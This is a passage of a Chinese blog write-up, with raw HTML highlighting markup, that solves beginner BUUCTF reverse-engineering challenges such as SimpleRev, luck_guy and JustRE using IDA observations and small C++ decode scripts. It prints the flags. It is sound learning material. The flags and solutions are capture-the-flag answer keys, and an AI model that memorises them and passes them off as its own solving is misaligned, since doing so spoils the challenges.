class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> key[<span class="number">99</span>] = &#123;</span><br><span class="line">  <span class="number">101</span>,  <span class="number">51</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">102</span>,  <span class="number">73</span>,  <span class="number">72</span>,  <span class="number">57</span>,  <span class="number">98</span>,  <span class="number">95</span>, </span><br><span class="line">   <span class="number">67</span>,  <span class="number">64</span>, <span class="number">110</span>,  <span class="number">64</span>, <span class="number">100</span>,  <span class="number">72</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line"> key[i] -= i;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(key[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> base64[<span class="number">50</span>];</span><br><span class="line"><span class="type">char</span> base64char[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">base64_decode</span><span class="params">(<span class="type">char</span> *base64, <span class="type">char</span> *originChar)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 temp[<span class="number">4</span>]; <span class="comment">// [rsp+23h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 k; <span class="comment">// [rsp+27h] [rbp-9h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( base64[i] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(temp, <span class="number">255</span>, <span class="built_in">sizeof</span>(temp));</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">0x3F</span>u; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( base64char[k] == base64[i] )</span><br><span class="line">        temp[<span class="number">0</span>] = k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">0x3F</span>u; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( base64char[k] == base64[i + <span class="number">1</span>] )</span><br><span class="line">        temp[<span class="number">1</span>] = k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">0x3F</span>u; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( base64char[k] == base64[i + <span class="number">2</span>] )</span><br><span class="line">        temp[<span class="number">2</span>] = k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">0x3F</span>u; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( base64char[k] == base64[i + <span class="number">3</span>] )</span><br><span class="line">        temp[<span class="number">3</span>] = k;</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = j++;</span><br><span class="line">    originChar[v2] = (temp[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp;amp; <span class="number">3</span> | (<span class="number">4</span> * temp[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( base64[i + <span class="number">2</span>] == <span class="number">61</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = j++;</span><br><span class="line">    originChar[v3] = (temp[<span class="number">2</span>] &gt;&gt; <span class="number">2</span>) &amp;amp; <span class="number">0xF</span> | (<span class="number">16</span> * temp[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( base64[i + <span class="number">3</span>] == <span class="number">61</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = j++;</span><br><span class="line">    originChar[v4] = temp[<span class="number">3</span>] &amp;amp; <span class="number">0x3F</span> | (temp[<span class="number">2</span>] &lt;&lt; <span class="number">6</span>);</span><br><span class="line">    i += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> de64[<span class="number">50</span>];</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="built_in">strcpy</span>(base64, <span class="string">&quot;e2lfbDB2ZV95b3V9&quot;</span>);<span class="comment">//密文 </span></span><br><span class="line"><span class="built_in">strcpy</span>(base64char, <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;</span>);<span class="comment">//秘钥 </span></span><br><span class="line"><span class="built_in">base64_decode</span>(base64, de64); </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="built_in">strlen</span>(base64); i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; de64[i];<span class="comment">//明文 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：i_l0ve_you</p><h2 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h2><p>拖进IDA看见这个，可以推断是个迷宫题：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag1.png"><br>在最后可以看到结束条件是走到#<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag2.png"><br>根据整体代码判断v3[25]是用来控制层数的，通过查阅v3的地址(00000035)和v7的地址(0000000C)恰好相差41可以推断最后它用来判断的v7就是v3，因此它的地图长这个样子：</p><p>*1111<br>01000<br>01010<br>00010<br>1111#</p><p>得到flag：222441144222</p><h2 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h2><p>打开IDA发现主要的加密在Decry函数中：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/SimpleRev1.png"><br>前面一段生成了key和text：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/SimpleRev2.png"><br>这里理论上下断点动调就可以得到最终结果，但是我动调会告诉我出现了一个奇奇怪怪的错误，所以我只好手动生成了,其中.elf采用逆序存储，因此需要反向解析：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> v9 = <span class="number">0x776F646168</span>;<span class="comment">//hadow</span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> src = <span class="number">0x534C43444E</span>;<span class="comment">//NDCLS</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(*((<span class="type">const</span> <span class="type">char</span>*)&amp;amp;v9 + i));</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl; </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(*((<span class="type">const</span> <span class="type">char</span>*)&amp;amp;src + i));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到<br>text &#x3D; “killshadow”<br>key &#x3D; “adsfkndcls”<br>接下来就是依据输入对Str2进行操作：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/SimpleRev3.png"><br>可以写个深搜找到答案;</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string text = <span class="string">&quot;killshadow&quot;</span>;</span><br><span class="line">string key = <span class="string">&quot;adsfkndcls&quot;</span>;</span><br><span class="line"><span class="type">int</span> i, j, k;</span><br><span class="line"><span class="type">int</span> v5 = key.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> tmp;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">65</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((j &gt;= <span class="string">&#x27;a&#x27;</span> &amp;amp;&amp;amp; j &lt;= <span class="string">&#x27;z&#x27;</span>) || (j &gt;= <span class="string">&#x27;A&#x27;</span> &amp;amp;&amp;amp; j &lt;= <span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">tmp = (j - <span class="number">39</span> - key[i] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line"><span class="keyword">if</span>(tmp == text[i])</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：KLDQCUDFZO<br>其实这个地方很明显每一个大写输入其实都可以用一个小写字母代替，也可以达到相同的效果，这样的输入是efxkwoxzti。但是我不理解这题后续也没有相应的验证部分，为什么可以直接用大写的输入。。。</p><h2 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h2><p>打开jd-gui可以看见：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/Java%E9%80%86%E5%90%91%E8%A7%A3%E5%AF%861.png"><br>这个hin简单：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans[<span class="number">99</span>] = &#123;<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans[i] = (ans[i] ^ <span class="number">0x20</span>) - <span class="string">&#x27;@&#x27;</span>;</span><br><span class="line">        cout &lt;&lt; <span class="built_in">char</span>(ans[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：This_is_the_flag_!</p><h2 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h2><p>这题点进去发现它会根据随机数除以200的余数进行操作：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BGXYCTF2019%5Dluck_guy1.png"><br>但是随机数嘛，多半是假的，所以可以猜测一下他会按照case4,case5,case1的顺序运行，考虑到elf的逆序存储，搞一个脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> a = <span class="number">0x7F666F6067756369</span>;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">char</span> key2[<span class="number">99</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">char</span> key1[<span class="number">99</span>] = <span class="string">&quot;GXY&#123;do_not_&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">key2[i] = <span class="built_in">char</span>(*((<span class="type">const</span> <span class="type">char</span>*)&amp;amp;a + i));</span><br><span class="line"><span class="keyword">if</span>(key2[i] % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">key2[i] -= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">key2[i]--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">strcat</span>(key1, key2);</span><br><span class="line">cout &lt;&lt; key1;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：do_not_gase_me</p><h2 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a>[BJDCTF2020]JustRE</h2><p>拖进IDA里看见代码很抽象，所以shift+F12找到这个：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BBJDCTF2020%5DJustRE1.png"><br>跟进可以看见这个：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%5BBJDCTF2020%5DJustRE2.png"><br>得到flag：1999902069a45792d233ac</p><h2 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a>刮开有奖</h2><p>点进去找到主函数：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%961.png"><br>v7到v16一看就是连在一起的，sub_4010F0对v7操作了一番，所以咱们也给它操作一番。sub_401000点进去发现是一个base64加密，所以写个解密脚本（要注意IDA里写的4*要删掉，那是电脑搜索int类型地址时使用的，因此会反编译出来，但是人类写的代码是不用的）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_2F10F0</span><span class="params">(<span class="type">int</span> *a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = i;</span><br><span class="line">    v6 = *(i + a1);</span><br><span class="line">    <span class="keyword">if</span> ( a2 &lt; result &amp;amp;&amp;amp; i &lt; result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; *(a1 + result) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++i;</span><br><span class="line">          *(v5 + a1) = *(a1 + result);</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">while</span> ( *(a1 + i) &lt;= v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ++i &gt;= result )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = i;</span><br><span class="line">          *(a1 + result) = *(i + a1);</span><br><span class="line">        &#125;</span><br><span class="line">        --result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; result );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">    *(a1 + result) = v6;</span><br><span class="line">    <span class="built_in">sub_2F10F0</span>(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">    result = a3;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> v7[<span class="number">99</span>];</span><br><span class="line">v7[<span class="number">0</span>] = <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line">v7[<span class="number">1</span>] = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">v7[<span class="number">2</span>] = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">v7[<span class="number">3</span>] = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">v7[<span class="number">4</span>] = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">v7[<span class="number">5</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">v7[<span class="number">6</span>] = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">v7[<span class="number">7</span>] = <span class="string">&#x27;H&#x27;</span>;</span><br><span class="line">v7[<span class="number">8</span>] = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">v7[<span class="number">9</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">v7[<span class="number">10</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line"><span class="built_in">sub_2F10F0</span>(v7, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(v7[<span class="number">0</span>] + <span class="number">34</span>);</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(v7[<span class="number">4</span>]);</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>((v7[<span class="number">2</span>] * <span class="number">3</span> + <span class="number">141</span>) / <span class="number">4</span>);</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(v7[<span class="number">7</span>] / <span class="number">9</span> * <span class="number">2</span> * <span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：UJWP1jMp</p><h2 id="简单注册器"><a href="#简单注册器" class="headerlink" title="简单注册器"></a>简单注册器</h2><p>先在APKIDE中打开，让他把smail文件变成class文件，再用jd-jui打开，看见加密函数：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-1/%E7%AE%80%E5%8D%95%E6%B3%A8%E5%86%8C%E5%99%A81.png"><br>hiiiiiin简单的鸭子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string paramView = <span class="string">&quot;dd2940c04462b4dd7c450528835cca15&quot;</span>;</span><br><span class="line">    paramView[<span class="number">2</span>] = ((<span class="type">char</span>)(paramView[<span class="number">2</span>] + paramView[<span class="number">3</span>] - <span class="number">50</span>));</span><br><span class="line">    paramView[<span class="number">4</span>] = ((<span class="type">char</span>)(paramView[<span class="number">2</span>] + paramView[<span class="number">5</span>] - <span class="number">48</span>));</span><br><span class="line">    paramView[<span class="number">30</span>] = ((<span class="type">char</span>)(paramView[<span class="number">31</span>] + paramView[<span class="number">9</span>] - <span class="number">48</span>));</span><br><span class="line">    paramView[<span class="number">14</span>] = ((<span class="type">char</span>)(paramView[<span class="number">27</span>] + paramView[<span class="number">28</span>] - <span class="number">97</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span 